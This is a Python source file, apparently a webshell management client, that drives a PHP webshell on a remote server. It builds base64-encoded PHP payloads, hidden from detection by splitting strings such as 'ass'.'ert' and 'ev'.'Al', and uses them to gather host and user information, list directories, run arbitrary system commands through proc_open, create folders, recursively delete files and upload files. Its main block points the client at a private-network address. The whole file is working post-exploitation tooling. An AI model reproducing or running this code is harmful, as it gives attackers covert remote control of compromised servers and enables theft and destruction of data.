import requests
import re
import base64
import binascii
import importlib
import urllib

class Shell:
    """Shell交互数据发送接收类
        :param url: webshell的地址
        :param pwd: webshell的密码
        :param plugin: 此webshell采用的插件，默认为plain
        :param method: 数据交互的方式
    """
    def __init__(self, url, pwd, plugin='plain', method='POST', coding='utf-8'):
        self.url = url
        self.pwd = pwd
        self.plugin = plugin
        self.method = method
        self.coding = coding
        self.plugin_module = None
        self.load_plugin()
        self.headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
        }
        self.datarule = re.compile(r'X@Y([\s\S]*)X@Y')
        self.current_dir_path = ''
        self.drivers = []
        self.system_info = ''
        self.separator = ''
        self.get_sys_info()
        self.basic_set()

    def load_plugin(self):
        self.plugin_module = importlib.import_module('plugins.%s' % self.plugin)

    def post_data(self, data):
        """post发送数据"""
        resp = requests.post(self.url, data=data, headers=self.headers)
        return resp

    def generate_post_data(self, functional_code, filename=''):
        """由功能性代码构造post数据"""
        b64_functional_code = bytes.decode(base64.b64encode(functional_code.encode(self.coding)))
        data = r"""array_map("ass"."ert",array("ev"."Al(\"\\\$xx=\\\"Ba"."SE6"."4_dEc"."OdE\\\";@ev"."al(\\\$xx('""" + \
                b64_functional_code + \
                r"""'));\");"));"""
        if filename:
            with open(filename, 'rb') as f:
                content = f.read()
            data += '&z1=%s' % bytes.decode(binascii.hexlify(content)).upper()
        data = '%s=%s' % (self.pwd, self.plugin_module.encrypt(data, self.pwd))
        return data

    def basic_set(self):
        """确定编码和路径分隔符"""
        self.separator = r'\\' if 'windows' in self.system_info.lower() else '/'

    def get_sys_info(self):
        """获取基本信息"""
        functional_code = r"""@ini_set("display_errors","0");@set_time_limit(0);if(PHP_VERSION<'5.3.0'){@set_magic_quotes_runtime(0);};echo("X@Y");$D=dirname(__FILE__);$R="{$D}\t";if(substr($D,0,1)!="/"){foreach(range("A","Z") as $L)if(is_dir("{$L}:"))$R.="{$L}:";}$R.="\t";$u=(function_exists('posix_getegid'))?@posix_getpwuid(@posix_geteuid()):'';$usr=($u)?$u['name']:@get_current_user();$R.=php_uname();$R.="({$usr})";print $R;;echo("X@Y");die();"""
        data = self.generate_post_data(functional_code)
        resp = self.post_data(data)
        system_info = {}
        if resp.status_code == 200:
            match = self.datarule.search(resp.text)
            if match:
                info_list = match.group(1).split('\t')
                self.current_dir_path = info_list[0]
                self.drivers = [i for i in info_list[1].split(':') if i!='']
                self.system_info = info_list[2]
                system_info['current_dir'] = self.current_dir_path
                system_info['drivers'] = self.drivers
                system_info['system_info'] = self.system_info
                return system_info
        return resp.text


    def get_dir(self, dir_path=''):
        """获取目录文件文件夹列表"""
        if not dir_path:
            dir_path = self.current_dir_path
        functional_code = r"""@ini_set("display_errors","0");@set_time_limit(0);if(PHP_VERSION<'5.3.0'){@set_magic_quotes_runtime(0);};echo("X@Y");$D='""" + \
                          dir_path + \
                          r"""';$F=@opendir($D);if($F==NULL){echo("ERROR:// Path Not Found Or No Permission!");}else{$M=NULL;$L=NULL;while($N=@readdir($F)){$P=$D.'/'.$N;$T=@date("Y-m-d H:i:s",@filemtime($P));@$E=substr(base_convert(@fileperms($P),10,8),-4);$R="\t".$T."\t".@filesize($P)."\t".$E."\n";if(@is_dir($P))$M.=$N."/".$R;else $L.=$N.$R;}echo $M.$L;@closedir($F);};echo("X@Y");die();"""
        data = self.generate_post_data(functional_code)
        resp = self.post_data(data)
        dir = {}
        if resp.status_code == 200:
            match = self.datarule.search(resp.content.decode(self.coding))
            if match:
                dir['dirs'] = [dict(zip(['name', 'mtime', 'size', 'perm'], i.split('\t'))) for i in match.group(1).strip().split('\n')]
                return dir
        return resp.content.decode(self.coding)

    def execute_command(self, command='', dir_path=''):
        """执行命令"""
        if not dir_path:
            dir_path = self.current_dir_path
        if not command:
            command = 'netstat -an'
        if 'windows' in self.system_info.lower():
            functional_code = r"""@ini_set("display_errors","0");@set_time_limit(0);if(PHP_VERSION<'5.3.0'){@set_magic_quotes_runtime(0);};echo("X@Y");$m=get_magic_quotes_gpc();$p='cmd';$s='cd /d """+\
                              dir_path + '&' + command +\
                              r"""&echo [S]&cd&echo [E]';$d=dirname($_SERVER["SCRIPT_FILENAME"]);$c=substr($d,0,1)=="/"?"-c \"{$s}\"":"/c \"{$s}\"";$r="{$p} {$c}";$array=array(array("pipe","r"),array("pipe","w"),array("pipe","w"));$fp=proc_open($r." 2>&1",$array,$pipes);$ret=stream_get_contents($pipes[1]);proc_close($fp);print $ret;;echo("X@Y");die();"""
        data = self.generate_post_data(functional_code)
        resp = self.post_data(data)
        result = {}
        if resp.status_code == 200:
            match = self.datarule.search(resp.content.decode(self.coding))
            if match:
                result_list = match.group(1).split('[S]')
                result['result'], result['command_dir'] = result_list[0], result_list[1].replace('[E]', '').strip()
                return result
        return resp.content.decode(self.coding)

    def mkdir(self, folder_name='', dir_path= ''):
        """新建文件夹
            @:param folder_name: 新建文件夹名称
            @:param dir_path: 新建文件夹所在父目录
        """
        if not dir_path:
            dir_path = self.current_dir_path
        if not folder_name:
            return {'mkdir': 0}
        functional_code = r"""@ini_set("display_errors","0");@set_time_limit(0);if(PHP_VERSION<'5.3.0'){@set_magic_quotes_runtime(0);};echo("X@Y");$f='""" + \
                          dir_path + self.separator + folder_name + \
                          r"""';echo(mkdir($f)?"1":"0");;echo("X@Y");die();"""
        data = self.generate_post_data(functional_code)
        resp = self.post_data(data)
        if resp.status_code == 200:
            match = self.datarule.search(resp.content.decode(self.coding))
            if match:
                return {'mkdir': match.group(1)}
        return resp.content.decode(self.coding)

    def del_file(self, file_name, dir_path=''):
        """删除文件或文件夹"""
        if not dir_path:
            dir_path = self.current_dir_path
        functional_code = r"""@ini_set("display_errors","0");@set_time_limit(0);if(PHP_VERSION<'5.3.0'){@set_magic_quotes_runtime(0);};echo("X@Y");$F='""" + \
                          dir_path + self.separator + file_name + \
                          r"""';function df($p){$m=@dir($p);while(@$f=$m->read()){$pf=$p."/".$f;if((is_dir($pf))&&($f!=".")&&($f!="..")){@chmod($pf,0777);df($pf);}if(is_file($pf)){@chmod($pf,0777);@unlink($pf);}}$m->close();@chmod($p,0777);return @rmdir($p);}if(is_dir($F))echo(df($F));else{echo(file_exists($F)?@unlink($F)?"1":"0":"0");};echo("X@Y");die();"""
        data = self.generate_post_data(functional_code)
        resp = self.post_data(data)
        if resp.status_code == 200:
            match = self.datarule.search(resp.content.decode(self.coding))
            if match:
                return {'delete': match.group(1)}
        return resp.content.decode(self.coding)

    def upload_file(self, file_name, dir_path=''):
        """上传文件
            @:param file_name: 文件所在路径
            @:param dir_path: 上传目的文件夹
        """
        if not dir_path:
            dir_path = self.current_dir_path
        functional_code = r"""@ini_set("display_errors","0");@set_time_limit(0);if(PHP_VERSION<'5.3.0'){@set_magic_quotes_runtime(0);};echo("X@Y");$f='""" + \
                          dir_path + self.separator + file_name.split('/')[-1] + \
                          r"""';$c=$_POST["z1"];$c=str_replace("\r","",$c);$c=str_replace("\n","",$c);$buf="";for($i=0;$i<strlen($c);$i+=2)$buf.=urldecode('%'.substr($c,$i,2));echo(@fwrite(fopen($f,'w'),$buf)?'1':'0');;echo("X@Y");die();"""
        data = self.generate_post_data(functional_code, file_name)
        resp = self.post_data(data)
        if resp.status_code == 200:
            match = self.datarule.search(resp.content.decode(self.coding))
            if match:
                return {'upload': match.group(1)}
        return resp.content.decode(self.coding)


if __name__ == '__main__':
    shell = Shell('http://192.168.4.170/a.php', 'a')
    print(shell.get_sys_info())
    print(shell.get_dir())
    print(shell.execute_command('netstat -an'))
    print(shell.mkdir('1111'))
    print(shell.upload_file('index.html'))